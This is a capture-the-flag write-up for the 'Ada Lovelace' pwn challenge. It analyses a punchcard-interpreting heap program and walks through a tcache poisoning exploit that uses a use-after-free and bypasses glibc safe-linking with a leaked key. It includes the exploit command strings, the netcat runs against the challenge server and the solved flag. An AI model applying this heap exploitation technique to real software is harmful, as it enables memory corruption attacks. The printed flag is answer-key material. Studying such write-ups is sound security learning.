# CyberHeroines 2023

## Ada Lovelace

> [Augusta Ada King](https://en.wikipedia.org/wiki/Ada_Lovelace), Countess of
> Lovelace (née Byron; 10 December 1815 – 27 November 1852) was an English
> mathematician and writer, chiefly known for her work on Charles Babbage's
> proposed mechanical general-purpose computer, the Analytical Engine. She was
> the first to recognise that the machine had applications beyond pure
> calculation. - [Wikipedia Entry](https://en.wikipedia.org/wiki/Ada_Lovelace)  
>  
> Chal: We reached out to our friends from [Research Innovations
> Inc](https://www.researchinnovations.com/) to build a pwn worthy to carry
> the name of the [first computer
> programming](https://www.youtube.com/watch?v=J7ITqnEmf-g). Pwn it and honor
> her legacy.  
>  
> Hints:  
>  
> It's using `Ubuntu GLIBC 2.35-0ubuntu3.1`  
Use the tcache  
>  
>  Author: N/A  
>  
> [`punchcard.tar.xz`](https://raw.githubusercontent.com/D13David/ctf-
> writeups/main/cyberheroines23/pwn/ada_lovelace/punchcard.tar.xz)

Tags: _pwn_

## Solution  
For this challenge we are given three files and a service connection. If we
connect to the service with netcat we see the following:

```bash  
$ nc 139.144.30.173 9999  
Overwrite the value at 0x5555555581b0 so it's 'flag'  
Your super secret xor key is 0x555555559  
Enter your program:  
```

To understand whats going on, we need to inspect the attached files. There is
a [python script](https://raw.githubusercontent.com/D13David/ctf-
writeups/main/cyberheroines23/pwn/ada_lovelace/punchcard.py) that basically
parses ascii represented punchcards into a program sequence. Lets look at one
of the testcases from this script.

```python  
 ____________________________________________________________  
/  1   2   3   4   5   6   7   8   9   a   b   c   d   e   f |  
/                                                             |  
|0                      o                                     |  
|1                              o       o                     |  
|2                                                            |  
|3                                                            |  
|4      o       o                   o                         |  
|5                                                            |  
|6                                                            |  
|7                                                            |  
|8                                                            |  
|9                                                            |  
|a  o       o                                                 |  
|b                                                            |  
|c* o       o       o       o                                 |  
|d                  o                                         |  
|e                                                            |  
|f                          o                                 |  
|_____________________________________________________________|  
```

To read this we walk along the header line: `1` is the first entry, `2` the
second etc... until we eventually reach `f` for entry 15. The values for each
entry can be read at the y-axis. So entry `1` has dots set at `a` and `c*`.
The `c*` here notes that the entry value is turned to upper case, so the first
entry gets the value `A`. The second entry has a dot at `4`, the third again
`a` and `c*` and so on. All in all the program sequence is `A4A4D0F141`.

One card can hold 15 entries max, if the program sequence is longer more cards
need to be preperated. In this case a card ends with `E` (`e` and `c*`), so
the interpreter knows there is more content available.

So, now we know how cards are preperated, but what can we do with it? For this
we inspect the file `mainframe` with `Ghidra`. The main function is very
short. First
[`ASLR`](https://en.wikipedia.org/wiki/Address_space_layout_randomization) is
disabled. Then the hints we already saw are printed to screen and the user is
required to enter a program. The program then is parsed and executed and if
parsing and execution returned successful the function `check_flag` is called.

```c  
 if (param_1 == 1) {  
   uVar2 = disable_aslr(param_2);  
   return uVar2;  
 }  
 set_timeout();  
 uVar2 = 0;  
 setvbuf(stdout,(char *)0x0,2,0);  
 print_hints();  
 local_18 = 0;  
 local_20 = 0;  
 local_28 = 0;  
 local_30 = 0;  
 local_38 = 0;  
 local_40 = 0;  
 local_48 = 0;  
 puts("Enter your program:");  
 sVar3 = read(0,&local_48,0x31);  
 if (sVar3 < 1) {  
   uVar2 = 1;  
 }  
 else {  
   iVar1 = parse_and_execute(&local_48);  
   if (iVar1 == 0) {  
     check_flag();  
   }  
 }  
```

So let's analyze this one by one. The function `print_hints` prints to us the
address of a global variable `check_var` and then mallocs a small chunk of
memory, frees the memory right away and prints to us the value of the memory
chunk *after* the memory was freed as `super secret xor key`. We need to keep
this in mind for later.

```c  
void print_hints(void)  
{  
 undefined8 *__ptr;  
  
 printf("Overwrite the value at %p so it\'s \'flag\'\n",&check_var);  
 __ptr = (undefined8 *)malloc(8);  
 free(__ptr);  
 printf("Your super secret xor key is %p\n",*__ptr);  
 return;  
}  
```

The function `check_flag` will test if the content of `check_var` is `flag`
and then print out the flag to us. Initially the content of `check_var` is
initialized to all zeros, so we won't see the flag. But as the hint noted,
it's our task to change the value on our own.

```c  
void check_flag(void)  
{  
 int iVar1;  
 FILE *__stream;  
 char *pcVar2;  
 char acStack264 [256];  
  
 iVar1 = bcmp(&check_var,"flag",5);  
 if (iVar1 == 0) {  
   __stream = fopen("./flag.txt","r");  
   if (__stream != (FILE *)0x0) {  
     pcVar2 = fgets(acStack264,0x100,__stream);  
     if (pcVar2 != (char *)0x0) {  
       puts(acStack264);  
     }  
     fclose(__stream);  
   }  
 }  
 return;  
}  
```

Lets move on to the last function, `parse_and_execute`. After cleaning up we
can see a pretty simple loop that parses the program sequence and executed the
associated commands.

```c  
 ptr = code;  
 codeLength = strlen(code);  
 offset = 0;  
 endOfCode = codeLength;  
 do {  
   if ((int)codeLength <= (int)offset) {  
     return 0;  
   }  
   charsRead = 0;  
   param1 = 0;  
   local_40 = 0;  
   local_48 = 0;  
   local_50 = 0;  
   param2 = 0;  
   pcVar1 = ptr + (int)offset;  
   paramsRead = __isoc99_sscanf(pcVar1,ALLOCATE_CMD_FMT,&param1,&charsRead);  
   if (paramsRead == 1) {  
     allocate_cmd(param1);  
   }  
   else {  
     paramsRead = __isoc99_sscanf(pcVar1,FILL_CMD_FMT,&param1,&param2,&charsRead);  
     if (paramsRead == 2) {  
       fill_cmd(param1,&param2);  
       codeLength = endOfCode;  
     }  
     else {  
       paramsRead = __isoc99_sscanf(pcVar1,DELETE_CMD_FMT,&param1,&charsRead);  
       if (paramsRead == 1) {  
         delete_cmd(param1);  
         codeLength = endOfCode;  
       }  
       else {  
         if (*pcVar1 != '\n') {  
           printf("Unrecognized command at index %d: %c\n",(ulong)offset);  
           return 1;  
         }  
         charsRead = 1;  
         codeLength = endOfCode;  
       }  
     }  
   }  
   offset = offset + charsRead;  
 } while( true );  
```

There are three commands in total: `allocate`, `fill` and `delete`. We are
going to investigate the commands in a moment, but lets check first how the
format is that is expected.

```bash  
Command   Format  
allocate  A%u%n  
fill      F%1u%20[0-9a-f]%n  
delete    D%1u%n  
```

Ok, so alloc commands start with `A`, fill commands with `F` and delete
commands with `D`. After the command `type` a number of parameters is
expected. The `%n` at the end of each format string gives the number of
characters read and is used by the parser loop to skip forward to the next
command start.

```c  
void allocate_cmd(size_t size)  
{  
 void *pvVar1;  
 long lVar2;  
  
 lVar2 = 0;  
 while( true ) {  
   if (lVar2 == 160) {  
     puts("Max number of chunks reached!");  
     return;  
   }  
   if (*(long *)(chunks + lVar2) == 0) break;  
   lVar2 = lVar2 + 16;  
 }  
 pvVar1 = malloc(size);  
 *(void **)(chunks + lVar2) = pvVar1;  
 *(size_t *)(chunks + lVar2 + 8) = size;  
 return;  
}  
```

The `allocate` command will allocate a number of bytes and stores the pointer
and size in a chunk slot. The chunk number is determindes before by iterating
over the chunk array and checking if an entry has `NULL` as pointer, if so,
the entry is considered free. So the chunk array contains memory of structure
(see next code snipped) and can hold a maximum of `160 / 16 = 10` chunks:

```c  
typedef struct chunk {  
 size_t size;  
 void* ptr;  
} chunk_t;  
```

Lets see what `delete` does:

```c  
void delete_cmd(uint index)  
{  
 if ((index < 10) && (*(void **)(chunks + (ulong)index * 0x10) != (void
*)0x0)) {  
   free(*(void **)(chunks + (ulong)index * 0x10));  
   return;  
 }  
 puts("Invalid chunk index!");  
 return;  
}  
```

The function takes the chunk index as input and does a range check. If the
index is in range `0-10` the pointer is deleted. One thing to note is that
field `ptr` of the chunk is not set to `NULL` and therefore the chunk entry is
still considered `allocated` and we still can manipulate memory even after it
was freed.

```c  
void fill_cmd(uint index,undefined8 values)  
{  
 uint uVar1;  
 long lVar2;  
 char *__s;  
 undefined auStack280 [264];  
  
 if ((index < 10) && (lVar2 = (ulong)index * 0x10, *(long *)(chunks + lVar2)
!= 0)) {  
   uVar1 = decode_hex(values,auStack280);  
   if ((-1 < (int)uVar1) && ((ulong)uVar1 <= *(ulong *)(chunks + lVar2 + 8)))
{  
     memcpy(*(void **)(chunks + lVar2),auStack280,(ulong)uVar1);  
     return;  
   }  
   __s = "Invalid data or exceeds chunk size.";  
 }  
 else {  
   __s = "Invalid chunk index.";  
 }  
 puts(__s);  
 return;  
}  
```

The `fill_cmd` function will take two parameters. Again the index of the chunk
that should be filled and the content that should be copied to the pointed
chunk memory. The values are meant to be a string of a hexadecimal value. The
value is decoded with `decode_hex` to a byte array and then copied to the
chunk pointed memory.

Lets complete the command table from above:

```bash  
Command   Format              Parameters  
allocate  A%u%n               size  
fill      F%1u%20[0-9a-f]%n   chunk index, string of hex-values  
delete    D%1u%n              chunk index  
```

Now we have a good overview over the functionality, we can think of a way how
we can exploit this so that we can write the value `flag` to `check_var`. To
find a good approach a hint was given: `Use the tcache`. The idea would be to
use a [`tcache poisoning
attack`](https://hackmd.io/@5Mo2wp7RQdCOYcqKeHl2mw/ByTHN47jf#TCACHE-
poisoning).

To understand this idea, we need to know how the tcache works. The `tcache` is
ment to speed up repeated small allocations (within the same thread). Lets
look at some code:

```c  
typedef struct tcache_entry  
{  
 struct tcache_entry *next;  
 /* This field exists to detect double frees.  */  
 uintptr_t key;  
} tcache_entry;

typedef struct tcache_perthread_struct  
{  
 uint16_t counts[TCACHE_MAX_BINS];  
 tcache_entry *entries[TCACHE_MAX_BINS];  
} tcache_perthread_struct;  
```

The tcache (`tcache_perthread_struct`) contains 64 (TCACHE_MAX_BINS) `bins`
(bin is the term for `free-list` used here) whereas every free-list has a
certain memory size attached. This is to classify allocations by size.
Whenever a (small enough) memory chunk is freed the associated free-list is
looked up, based on the memory chunk size, and the memory chunk is attached to
the free-list. The actual memory chunk is not freed but just kept alive until
another allocation requests a fitting amount of bytes. This will greatly
reduce allocation speed as a full rountrip to kernel level can be avoided.

The free-list itself is implemented as singly linked list. Deleted items are
added to the front of the list and allocations take the front item as well. We
can see the free-list therefore as `LIFO` queue.

Lets make an example:

```c  
void* p1 = malloc(8)  
void* p2 = malloc(8)  
void* p3 = malloc(8)

                     //               free-list head  
                     //                    v  
free(p3)              //          tcache -> p3  
free(p1)              //          tcache -> p1 -> p3  
free(p2)              //          tcache -> p2 -> p1 -> p3

void* p4 = malloc(8)  // p4 = p2, tcache -> p1 -> p3  
void* p5 = malloc(8)  // p5 = p1, tcache -> p3  
```

We can see how the linked list is build and how the memory chunks are reused
later. Lets have a look on how the `allocation` and `free` for `tcache` is
implemented:

```c  
/* Caller must ensure that we know tc_idx is valid and there's room  
  for more chunks.  */  
static __always_inline void  
tcache_put (mchunkptr chunk, size_t tc_idx)  
{  
 tcache_entry *e = (tcache_entry *) chunk2mem (chunk);

 /* Mark this chunk as "in the tcache" so the test in _int_free will  
    detect a double free.  */  
 e->key = tcache_key;

 e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);  
 tcache->entries[tc_idx] = e;  
 ++(tcache->counts[tc_idx]);  
}

/* Caller must ensure that we know tc_idx is valid and there's  
  available chunks to remove.  */  
static __always_inline void *  
tcache_get (size_t tc_idx)  
{  
 tcache_entry *e = tcache->entries[tc_idx];  
 if (__glibc_unlikely (!aligned_OK (e)))  
   malloc_printerr ("malloc(): unaligned tcache chunk detected");  
 tcache->entries[tc_idx] = REVEAL_PTR (e->next);  
 --(tcache->counts[tc_idx]);  
 e->key = 0;  
 return (void *) e;  
}  
```

In short, `tcache_get` looks up the free-list head for a given index (`tc_idx`
which is derived based on the chunk size, as mentioned above). Then the list
head is unlinked and the next chunk is made head of the list. If the next
element is `NULL` the head of the list is `NULL` and the free list is
considered empty. There are a few security measurements in place that allow to
detect unaligned memory addresses for tcache entries or double chunk release.
But we don't care for now. The thing is, if we can control, for a entry, where
the `next` pointer points to the `next` pointer will be made head of list and
the next `allocation` will return our spoofed pointer. This allows for
instance to point to any stack memory address, or, interesting for us, to
global variables.

The `tcache poisoning` works like follows:

```c  
ptr0 = malloc small chunk  
ptr1 = malloc small chunk

free ptr1  
free ptr0

((tcache_entry*)ptr0)->next = modified pointer

ptr0 = malloc small chunk  
ptr1 = malloc small chunk // <- this will be our modified pointer  
```

Translating this to our `mainframe` program code (naming collision: chunk here
is the chunk array used in mainframe, not the allocated chunk or entry in
tcache):

```bash  
A8                    # allocate 8 bytes to chunk[0]  
A8                    # allocate 8 bytes to chunk[1]  
D1                    # delete chunk[1]  
D0                    # delete chunk[2]

# at this point our tcache looks like this  
# tcache -> D0 -> D1

F0b081555555550000    # fill chunk[0] with address of 'check_var'

# at this point our tcache looks like this  
# tcache -> D0 -> check_var

A8                    # alloc 8 bytes to chunk[2]  
A8                    # alloc 8 bytes to chunk[3], alloc will return the
address pointing to 'check_var' now  
F3666c6167            # write 'flag' to chunk[3]  
```

Why do we write `flag` to chunk[3]? Since `delete` is not setting chunk `ptr`
to `NULL` the first two chunks are still considered allocated, so the next two
allocations are going to chunk[2] and chunk[3].

Well, perfection! Now we need to translate this into punchcards. I wrote a
small [`python script`](https://raw.githubusercontent.com/D13David/ctf-
writeups/main/cyberheroines23/pwn/ada_lovelace/gen.py) to automate this. Since
doing this manually,is a laborious process. Lets try it:

```bash  
$ python gen.py A8A8D1D0F0b081555555550000A8A8F3666c6167 | nc 139.144.30.173 9999  
Overwrite the value at 0x5555555581b0 so it's 'flag'  
Your super secret xor key is 0x555555559  
Enter your program:  
malloc(): unaligned tcache chunk detected  
```

Didn't work.. But why? Lets review the other hint given: `It's using Ubuntu
GLIBC 2.35-0ubuntu3.1`. This version of glibc uses [`safe-
linking`](https://research.checkpoint.com/2020/safe-linking-
eliminating-a-20-year-old-malloc-exploit-primitive/).

Ok, we should have cared earlier for the security mechanisms in place for
`tcache`. If we look closely there is a `REVEAL_PTR` macro used to fetch the
pointer to the next linked element. The idea here is, that not the raw
pointers are stored but some sort of `signed` pointer that avoids tampering.
We can see how the macro is defined here:

```c  
/* Safe-Linking:  
  Use randomness from ASLR (mmap_base) to protect single-linked lists  
  of Fast-Bins and TCache.  That is, mask the "next" pointers of the  
  lists' chunks, and also perform allocation alignment checks on them.  
  This mechanism reduces the risk of pointer hijacking, as was done with  
  Safe-Unlinking in the double-linked lists of Small-Bins.  
  It assumes a minimum page size of 4096 bytes (12 bits).  Systems with  
  larger pages provide less entropy, although the pointer mangling  
  still works.  */  
#define PROTECT_PTR(pos, ptr) \  
 ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))  
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)  
```

Pointers are protected by taking the *address* of `next` of the chunk that is
about to be added to the free list, shifting that address by 12 bits to the
right (that is roughly the page offset part) and xoring this mask with the
current head pointer. Due to ASLR there the key is randomized and cannot be
known without a explicit leak.

Now the `secret key` comes into play. Lets recap how the leak is generated:

```c  
__ptr = (undefined8 *)malloc(8);  
free(__ptr);  
printf("Your super secret xor key is %p\n",*__ptr);  
```

At this point the `tcache` is empty, therefore, when `__ptr` is deleted
`PROTECT_PTR` is called with `NULL` as `ptr` argument leaving us with a key we
can use for `signing` our spoofed address. This should at least work as long
as chunks are coming from the same memory page, or we can make sure we access
the same chunk that leaked us the address. As a side note, ASLR was disabled
for this challenge, but this doesn't matter, the solution works with and
without ASLR.

To `sign` our address we only have to xor the address with the leaked key.
When `tcache_get` tries xor with the same key the address is again intact.
Lets try again:

```python  
>>> p64(0x5555555581b0^0x555555559).hex()  
'e9d4000050550000'  
```

```bash  
$ python gen.py A8A8D1D0F0e9d4000050550000A8A8F3666c6167 | nc 139.144.30.173 9999  
Overwrite the value at 0x5555555581b0 so it's 'flag'  
Your super secret xor key is 0x555555559  
Enter your program:  
chctf{UR_b3st_and_w1sest_REfuge_fR0m_All_TRoubl3s_is_in_ur_science}  
```

And win.. we got the flag.

Flag `chctf{UR_b3st_and_w1sest_REfuge_fR0m_All_TRoubl3s_is_in_ur_science}`

Original writeup (https://github.com/D13David/ctf-
writeups/blob/main/cyberheroines23/pwn/ada_lovelace/README.md).